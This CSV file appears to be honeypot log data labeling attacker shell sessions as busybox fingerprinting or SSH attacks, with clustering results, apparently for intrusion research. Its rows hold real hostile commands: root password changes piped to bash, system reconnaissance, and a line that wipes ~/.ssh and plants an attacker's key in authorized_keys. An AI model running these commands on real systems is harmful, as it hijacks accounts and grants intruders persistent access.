,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
5944,23dfbb76838e,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,2.7164313793182373,0,3,2
5945,3adc4d2bae87,13,enable,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5946,3adc4d2bae87,13,system,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5947,3adc4d2bae87,13,system,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5948,3adc4d2bae87,13,shell,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5949,3adc4d2bae87,13,shell,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5950,3adc4d2bae87,13,sh,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5951,3adc4d2bae87,13,cat /proc/mounts; /bin/busybox CQRJW,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5952,3adc4d2bae87,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CQRJW,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5953,3adc4d2bae87,13,tftp; wget; /bin/busybox CQRJW,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5954,3adc4d2bae87,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5955,3adc4d2bae87,13,while read i,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5956,3adc4d2bae87,13,/bin/busybox CQRJW,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5957,3adc4d2bae87,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,2.7519795894622803,0,3,2
5958,65c54b7ddd41,13,enable,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5959,65c54b7ddd41,13,system,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5960,65c54b7ddd41,13,system,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5961,65c54b7ddd41,13,shell,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5962,65c54b7ddd41,13,shell,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5963,65c54b7ddd41,13,sh,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5964,65c54b7ddd41,13,cat /proc/mounts; /bin/busybox BLEJP,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5965,65c54b7ddd41,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BLEJP,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5966,65c54b7ddd41,13,tftp; wget; /bin/busybox BLEJP,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5967,65c54b7ddd41,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5968,65c54b7ddd41,13,while read i,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5969,65c54b7ddd41,13,/bin/busybox BLEJP,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5970,65c54b7ddd41,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,2.9954802989959712,0,3,2
5971,d5ad6281fa57,13,enable,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5972,d5ad6281fa57,13,system,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5973,d5ad6281fa57,13,system,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5974,d5ad6281fa57,13,shell,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5975,d5ad6281fa57,13,shell,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5976,d5ad6281fa57,13,sh,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5977,d5ad6281fa57,13,cat /proc/mounts; /bin/busybox AEWFE,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5978,d5ad6281fa57,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AEWFE,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5979,d5ad6281fa57,13,tftp; wget; /bin/busybox AEWFE,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5980,d5ad6281fa57,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5981,d5ad6281fa57,13,while read i,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5982,d5ad6281fa57,13,/bin/busybox AEWFE,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5983,d5ad6281fa57,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,3.5623104572296143,0,3,2
5984,1a687c39299c,13,enable,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5985,1a687c39299c,13,system,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5986,1a687c39299c,13,system,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5987,1a687c39299c,13,shell,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5988,1a687c39299c,13,shell,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5989,1a687c39299c,13,sh,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5990,1a687c39299c,13,cat /proc/mounts; /bin/busybox XEAHL,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5991,1a687c39299c,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XEAHL,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5992,1a687c39299c,13,tftp; wget; /bin/busybox XEAHL,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5993,1a687c39299c,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5994,1a687c39299c,13,while read i,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5995,1a687c39299c,13,/bin/busybox XEAHL,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5996,1a687c39299c,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,4.3743438720703125,0,3,2
5997,8e5118bc4c84,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,5.468994140625,1,2,3
5998,8e5118bc4c84,15,"echo ""root:PH8uhyJjHJ1E""|chpasswd|bash",Malicious activity,1,SSH attack,5.468994140625,1,2,3
5999,8e5118bc4c84,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,5.468994140625,1,2,3
6000,8e5118bc4c84,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,5.468994140625,1,2,3
6001,8e5118bc4c84,15,ls -lh $(which ls),Malicious activity,1,SSH attack,5.468994140625,1,2,3
6002,8e5118bc4c84,15,which ls,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6003,8e5118bc4c84,15,crontab -l,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6004,8e5118bc4c84,15,w,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6005,8e5118bc4c84,15,uname -m,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6006,8e5118bc4c84,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6007,8e5118bc4c84,15,top,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6008,8e5118bc4c84,15,uname,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6009,8e5118bc4c84,15,uname -a,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6010,8e5118bc4c84,15,lscpu | grep Model,Malicious activity,1,SSH attack,5.468994140625,1,2,3
6011,8e5118bc4c84,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,5.468994140625,1,2,3
6012,431912420b26,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6013,431912420b26,15,"echo ""root:AcfPO6Ll6coR""|chpasswd|bash",Malicious activity,1,SSH attack,11.133953332901,1,2,3
6014,431912420b26,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,11.133953332901,1,2,3
6015,431912420b26,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,11.133953332901,1,2,3
6016,431912420b26,15,ls -lh $(which ls),Malicious activity,1,SSH attack,11.133953332901,1,2,3
6017,431912420b26,15,which ls,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6018,431912420b26,15,crontab -l,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6019,431912420b26,15,w,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6020,431912420b26,15,uname -m,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6021,431912420b26,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6022,431912420b26,15,top,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6023,431912420b26,15,uname,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6024,431912420b26,15,uname -a,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6025,431912420b26,15,lscpu | grep Model,Malicious activity,1,SSH attack,11.133953332901,1,2,3
6026,431912420b26,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,11.133953332901,1,2,3
6027,0e9d457a22aa,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6028,0e9d457a22aa,15,"echo ""root:M7SLwYHstwpw""|chpasswd|bash",Malicious activity,1,SSH attack,55.395024061203,1,2,3
6029,0e9d457a22aa,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,55.395024061203,1,2,3
6030,0e9d457a22aa,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,55.395024061203,1,2,3
6031,0e9d457a22aa,15,ls -lh $(which ls),Malicious activity,1,SSH attack,55.395024061203,1,2,3
6032,0e9d457a22aa,15,which ls,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6033,0e9d457a22aa,15,crontab -l,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6034,0e9d457a22aa,15,w,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6035,0e9d457a22aa,15,uname -m,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6036,0e9d457a22aa,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6037,0e9d457a22aa,15,top,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6038,0e9d457a22aa,15,uname,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6039,0e9d457a22aa,15,uname -a,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6040,0e9d457a22aa,15,lscpu | grep Model,Malicious activity,1,SSH attack,55.395024061203,1,2,3
6041,0e9d457a22aa,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,55.395024061203,1,2,3
6042,2b8a5cfd674a,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6043,2b8a5cfd674a,18,"echo -e ""password\ntbBhiSMpODdd\ntbBhiSMpODdd""|passwd|bash",Malicious activity,1,SSH attack,70.181321144104,1,2,3
6044,2b8a5cfd674a,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6045,2b8a5cfd674a,18,Enter new UNIX password:,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6046,2b8a5cfd674a,18,"echo ""password\ntbBhiSMpODdd\ntbBhiSMpODdd\n""|passwd",Malicious activity,1,SSH attack,70.181321144104,1,2,3
6047,2b8a5cfd674a,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,70.181321144104,1,2,3
6048,2b8a5cfd674a,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,70.181321144104,1,2,3
6049,2b8a5cfd674a,18,ls -lh $(which ls),Malicious activity,1,SSH attack,70.181321144104,1,2,3
6050,2b8a5cfd674a,18,which ls,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6051,2b8a5cfd674a,18,crontab -l,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6052,2b8a5cfd674a,18,w,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6053,2b8a5cfd674a,18,uname -m,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6054,2b8a5cfd674a,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6055,2b8a5cfd674a,18,top,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6056,2b8a5cfd674a,18,uname,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6057,2b8a5cfd674a,18,uname -a,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6058,2b8a5cfd674a,18,lscpu | grep Model,Malicious activity,1,SSH attack,70.181321144104,1,2,3
6059,2b8a5cfd674a,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,70.181321144104,1,2,3
6060,ae27afccb489,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6061,ae27afccb489,15,"echo ""root:TvfNiHM7bsu6""|chpasswd|bash",Malicious activity,1,SSH attack,76.904226064682,1,2,3
6062,ae27afccb489,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,76.904226064682,1,2,3
6063,ae27afccb489,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,76.904226064682,1,2,3
6064,ae27afccb489,15,ls -lh $(which ls),Malicious activity,1,SSH attack,76.904226064682,1,2,3
6065,ae27afccb489,15,which ls,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6066,ae27afccb489,15,crontab -l,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6067,ae27afccb489,15,w,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6068,ae27afccb489,15,uname -m,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6069,ae27afccb489,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6070,ae27afccb489,15,top,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6071,ae27afccb489,15,uname,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6072,ae27afccb489,15,uname -a,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6073,ae27afccb489,15,lscpu | grep Model,Malicious activity,1,SSH attack,76.904226064682,1,2,3
6074,ae27afccb489,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,76.904226064682,1,2,3
6075,b89e4b0e33c5,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6076,b89e4b0e33c5,18,"echo -e ""gateway123\n2AewKVR7cWlU\n2AewKVR7cWlU""|passwd|bash",Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6077,b89e4b0e33c5,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6078,b89e4b0e33c5,18,Enter new UNIX password:,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6079,b89e4b0e33c5,18,"echo ""gateway123\n2AewKVR7cWlU\n2AewKVR7cWlU\n""|passwd",Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6080,b89e4b0e33c5,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6081,b89e4b0e33c5,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6082,b89e4b0e33c5,18,ls -lh $(which ls),Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6083,b89e4b0e33c5,18,which ls,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6084,b89e4b0e33c5,18,crontab -l,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6085,b89e4b0e33c5,18,w,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6086,b89e4b0e33c5,18,uname -m,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6087,b89e4b0e33c5,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6088,b89e4b0e33c5,18,top,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6089,b89e4b0e33c5,18,uname,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6090,b89e4b0e33c5,18,uname -a,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6091,b89e4b0e33c5,18,lscpu | grep Model,Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6092,b89e4b0e33c5,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,11.3058340549469,1,2,3
6093,b0f40254e37c,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6094,b0f40254e37c,18,"echo -e ""pippo\nKckK6GHqcSDr\nKckK6GHqcSDr""|passwd|bash",Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6095,b0f40254e37c,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6096,b0f40254e37c,18,Enter new UNIX password:,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6097,b0f40254e37c,18,"echo ""pippo\nKckK6GHqcSDr\nKckK6GHqcSDr\n""|passwd",Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6098,b0f40254e37c,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6099,b0f40254e37c,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6100,b0f40254e37c,18,ls -lh $(which ls),Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6101,b0f40254e37c,18,which ls,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6102,b0f40254e37c,18,crontab -l,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6103,b0f40254e37c,18,w,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6104,b0f40254e37c,18,uname -m,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6105,b0f40254e37c,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6106,b0f40254e37c,18,top,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6107,b0f40254e37c,18,uname,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6108,b0f40254e37c,18,uname -a,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6109,b0f40254e37c,18,lscpu | grep Model,Malicious activity,1,SSH attack,11.4630024433136,1,2,3
6110,b0f40254e37c,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,11.4630024433136,1,2,3
